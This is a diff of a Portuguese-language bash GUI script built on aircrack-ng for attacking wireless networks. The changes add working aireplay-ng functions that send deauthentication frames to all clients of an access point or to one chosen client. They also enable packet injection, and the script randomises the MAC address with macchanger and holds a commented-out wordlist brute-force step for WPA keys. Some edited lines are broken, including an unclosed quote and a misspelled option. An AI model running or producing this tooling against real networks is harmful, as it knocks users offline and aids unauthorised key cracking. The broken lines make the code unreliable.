@@ -90,9 +90,7 @@ function setar_parametros(){
 	--field "ESSID" "" \
 	--field "Channel" "" \
 	--field "Interface Mon" "wlan0mon" \
-	#--field "Salvar em" "$DATE.cap" \
 	#--field "[ Wordlist ]":BTN "yad --file --maximized" \
-	#--field "[ Salvar na pasta ]":BTN "yad --title $TITLE --maximized --file --directory" \
 	--button ok \
 	--button cancel \
 	--undecorated \
@@ -115,36 +113,39 @@ if [ -z $BSSID  ] || [ -z $ESSID ] || [ -z $CHANNEL ] || [ -z INTERFACE_MON ] ; 
 	exit 1
 fi
 
-(xterm -geometry 85x25 -title "Escaneando rede especifica" -e "airodump-ng \
---bssid $BSSID \
---essid $ESSID \
---channel $CHANNEL \
---write $DIR/$ARQ $INTERFACE_MON" &) || \
-echo -e "[ FALHA ] Ocorreram erros"
+(xterm -geometry 85x25 -title "Escaneando rede a rede sem fio: $ESSID" \ 
+-e "airodump-ng --bssid $BSSID --essid $ESSID --channel $CHANNEL --write $DIR/$ARQ $INTERFACE_MON" &) || \
+echo -e "[ FALHA ] Ocorreram erros em escanear a rede sem fio: $ESSID"
 
 }
 
 function deauth_todos() {
-# Desautentica todas as STA do AP
-(aireplay-ng --interactive 1000 -c $CLIENTE wlan0mon) || \
-echo "[ FALHA ] Ocorreram erros em fazer o deauth do cliente: $CLIENTE"
+# Envia 1 pacote de Desautenticação para todas as STA conectadas ao AP
+(xterm -geometry 85x25 -tilte "Enviando pacotes de desautenticação (Deauth) para todos as STA conectadas a rede sem fio: $ESSID" \
+-e  "aireplay-ng -0 1 -a $BSSID $INTERFACE_MON" &) || \
+echo "[ FALHA ] Ocorreram erros em fazer deauth dos hosts no AP: $ESSID"
+
+}
+
+function deauth_cliente_especifico() {
+# Envia 1 pacote de Desautenticação para uma STA conectada a um AP especifico
+(xterm -geometry 85x25 -title "Desautenticando (Deauth) a STA $CLIENT na rede $ESSID" \
+-e "aireplay-ng -0 1 -a $BSSID -c $CLIENT $INTERFACE_MON" --ignore-negative-one &) || \
+echo "[ FALHA ] Ocorreram erros em fazer o deuth da STA $CLIENT na rede $ESSID"
 
 }
 
 #function deauth_mdk3() {
-#xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN & 
-#|| { echo "[ FALHA ]"; }
-#}
-
-#function deauth_alvo_especifico() {
-#xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI & 
-#|| { echo "[ FALHA ]"; }
+#(xterm -geometry 85x25 -title "Desautenticando usando mdk3 AP: $ESSID" \
+#-e "mdk3 $INTERFACE_MON $OUTPUT/mdk3.txt -c $CLINT) & || \
+#echo "[ FALHA ]"
 #}
 
 
-#function injetar(){
-#(aireplay-ng --interactive 1000 -c $CLIENTE $INTERFACE_MON) || echo "[ FALHA ]"
-#}
+function injetar(){
+(xterm -geometry 85x25i --title "Injetando pacotes " aireplay-ng --interactive 1000 -c $CLIENTE $INTERFACE_MON) || echo "[ FALHA ]"
+
+}
 
 #function brute_force_psk() {
 #(aircrack-ng -w $WORDLIST $OUTPUT/$ARQ) || echo "[ FALHA ]"
@@ -162,7 +163,7 @@ service networking restart
 }
 
 function alterar_mac() {
-	ifdown $INTERFACE &> /dev/null || echo "[ ok ] ifdown";
+	ifdown $INTERFACE &> /dev/null || echo "[ ok ] ifdown;
 	macchanger -r $INTERFACE &> /dev/null
 	ifup $INTERFACE &> /dev/null || echo "[ ok ] ifup"
 
@@ -171,13 +172,6 @@ function alterar_mac() {
 return 0
 
 }
-#function parametros_obrigatorios() {
-#}
-
-
-#function config() {
-#echo
-#}
 
 #function ip_publico() {
 # Obtem oo endereço ip publico
